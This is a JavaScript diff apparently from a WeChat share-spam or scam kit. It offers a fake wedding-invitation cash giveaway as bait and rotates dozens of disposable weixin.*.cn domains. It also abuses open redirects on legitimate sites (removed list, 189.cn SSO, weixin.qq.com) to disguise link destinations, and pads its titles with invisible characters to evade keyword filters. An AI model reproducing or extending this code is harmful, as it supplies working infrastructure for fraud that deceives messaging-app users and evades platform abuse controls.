@@ -5,30 +5,55 @@ var timelineShareCount = 0;
 var appSuccessCount = 0;
 var timelineSuccessCount = 0;
 
-var jumpUrls = ['http://dolphin.yoka.com/c?z=yoka&u=', 'https://www.zzidc.com/tomember?url=', 'http://manhua.weibo.cn/comic/comic/redirect?url=', 'https://account.36kr.com/api/v1/oauth/sign-out?client_id=6&ok_url=', 'http://rtb.behe.com/ck?landing=', 'http://mai.mama.cn/wap/member/loginCallBack?redirectUrl=', 'http://v10.sznews.com/c?z=sznews&u=', 'http://m.hao123.com/j.php?php=1&action=headline&url=', 'http://3g.hao123.com/j.php?php=1&action=headline&url=']
 
-var domains = ['weixin.wzxga.cn',
-'weixin.wzxbz.cn',
-'weixin.wzxjd.cn',
-'weixin.wzxey.cn',
-'weixin.wzxgy.cn',
+
+var domains = ['weixin.wzxey.cn',
 'weixin.wzxdv.cn',
-'weixin.wzxjk.cn',
-'weixin.wzxbs.cn',
-'weixin.wzxcb.cn',
 'weixin.wzxbw.cn',
-'weixin.wzxds.cn',
-'weixin.wzxji.cn',
-'weixin.wzxdq.cn',
-'weixin.wzxei.cn',
-'weixin.wzxjg.cn',
 'weixin.wzxfl.cn',
-'weixin.wzxdo.cn',
-'weixin.wzxim.cn',
 'weixin.wzxex.cn',
 'weixin.wzxja.cn',
 'weixin.wzxec.cn',
-'weixin.wzxik.cn']
+'weixin.fjqlwy.cn',
+'weixin.drkang.cn',
+'weixin.wuifw.cn',
+'weixin.ucrxz.cn',
+'weixin.zjadd.cn',
+'weixin.aokry.cn',
+'weixin.nrepu.cn',
+'weixin.nrxxd.cn',
+'weixin.de1t2.cn',
+'weixin.8w97o.cn',
+'weixin.4d5ec.cn',
+'weixin.ed1f9.cn',
+'weixin.mamrz.cn',
+'weixin.aczeb.cn',
+'weixin.kobri.cn',
+'weixin.xvgwf.cn',
+'weixin.izovd.cn',
+'weixin.1b2fb.cn',
+'weixin.jy715.cn',
+'weixin.kblqv.cn',
+'weixin.c8u4m.cn',
+'weixin.1pu83.cn',
+'weixin.wnefb.cn',
+'weixin.tieoy.cn',
+'weixin.icaui.cn',
+'weixin.zvvcq.cn',
+'weixin.65y8a.cn',
+'weixin.4di96.cn',
+'weixin.sc9l5.cn',
+'weixin.olaih.cn',
+'weixin.ykb45.cn',
+'weixin.yazvf.cn',
+'weixin.qitcs.cn',
+'weixin.mnncx.cn',
+'weixin.jzvem.cn',
+'weixin.mlfya.cn',
+'weixin.zaczr.cn',
+'weixin.b5l9d.cn',
+'weixin.dtdang.cn',
+'weixin.dhcti.cn',]
 
 
 var tips = {
@@ -56,21 +81,21 @@ var flow = {
         imgUrl:'http://img04.sogoucdn.com/app/a/100520146/5E76B1521EFF6DE3F957D4547CE1DD6B',
         type:'app',
         tip:'success',
-        link:"http://"+rndStr(rnd(5,8))+".189.cn/dqmh/ssoLink.do?method=skip&platNo=93507&toStUrl=http://189.cn." + domains[rnd(0,domains.length - 1)] + "/" + rndStr(5) + "goto/" + rndStr(6) + ".html?from=true&t="  + (new Date).getTime() 
+        link:"https://as.weixin.qq.com/cgi-bin/amazing?url=" + domains[rnd(0,domains.length - 1)] + "/" + rndStr(5) + "goto/" + rndStr(6) + ".html?from=true&t="  + (new Date).getTime() 
     },{
         title:'婚͏͏͏͏͏͏͏͏͏͏礼邀͏͏请͏͏͏函派͏͏͏͏钱啦！！',
         desc:'喜钱人人有礼',
         imgUrl:'http://img04.sogoucdn.com/app/a/100520146/5E76B1521EFF6DE3F957D4547CE1DD6B',
         type:'app',
         tip:'fail',
-        link:"http://"+rndStr(rnd(5,8))+".189.cn/dqmh/ssoLink.do?method=skip&platNo=93507&toStUrl=http://189.cn." + domains[rnd(0,domains.length - 1)] + "/" + rndStr(5) + "goto/" + rndStr(6) + ".html?from=true&t="  + (new Date).getTime() 
+        link:"https://as.weixin.qq.com/cgi-bin/amazing?url=" + domains[rnd(0,domains.length - 1)] + "/" + rndStr(5) + "goto/" + rndStr(6) + ".html?from=true&t="  + (new Date).getTime() 
     },{
         title:'婚͏͏͏͏͏͏͏͏͏͏礼邀͏͏请͏͏͏函派͏͏͏͏钱啦！！',
         desc:'喜钱人人有礼',
         imgUrl:'http://img04.sogoucdn.com/app/a/100520146/5E76B1521EFF6DE3F957D4547CE1DD6B',
         type:'app',
         tip:'success',
-        link:"http://"+rndStr(rnd(5,8))+".189.cn/dqmh/ssoLink.do?method=skip&platNo=93507&toStUrl=http://189.cn." + domains[rnd(0,domains.length - 1)] + "/" + rndStr(5) + "goto/" + rndStr(6) + ".html?from=true&t="  + (new Date).getTime() 
+        link:"https://as.weixin.qq.com/cgi-bin/amazing?url=" + domains[rnd(0,domains.length - 1)] + "/" + rndStr(5) + "goto/" + rndStr(6) + ".html?from=true&t="  + (new Date).getTime() 
     }],
     timeline:[{
         title:'婚͏͏͏͏͏͏͏͏͏͏礼邀͏͏请͏͏͏函派͏͏͏͏钱啦！！',
@@ -78,14 +103,14 @@ var flow = {
         imgUrl:'http://img04.sogoucdn.com/app/a/100520146/5E76B1521EFF6DE3F957D4547CE1DD6B',
         type:'timeline',
         tip:'fail',
-        link:"http://"+rndStr(rnd(5,8))+".189.cn/dqmh/ssoLink.do?method=skip&platNo=93507&toStUrl=http://189.cn." + domains[rnd(0,domains.length - 1)] + "/" + rndStr(5) + "goto/" + rndStr(6) + ".html?from=true&t="  + (new Date).getTime() 
+        link:"https://as.weixin.qq.com/cgi-bin/amazing?url=" + domains[rnd(0,domains.length - 1)] + "/" + rndStr(5) + "goto/" + rndStr(6) + ".html?from=true&t="  + (new Date).getTime() 
     },{
         title:'婚͏͏͏͏͏͏͏͏͏͏礼邀͏͏请͏͏͏函派͏͏͏͏钱啦！！',
         desc:'喜钱人人有礼',
         imgUrl:'http://img04.sogoucdn.com/app/a/100520146/5E76B1521EFF6DE3F957D4547CE1DD6B',
         type:'timeline',
         tip:'success',
-        link:"http://"+rndStr(rnd(5,8))+".189.cn/dqmh/ssoLink.do?method=skip&platNo=93507&toStUrl=http://189.cn." + domains[rnd(0,domains.length - 1)] + "/" + rndStr(5) + "goto/" + rndStr(6) + ".html?from=true&t="  + (new Date).getTime() 
+        link:"https://as.weixin.qq.com/cgi-bin/amazing?url=" + domains[rnd(0,domains.length - 1)] + "/" + rndStr(5) + "goto/" + rndStr(6) + ".html?from=true&t="  + (new Date).getTime() 
     }]
 }
 
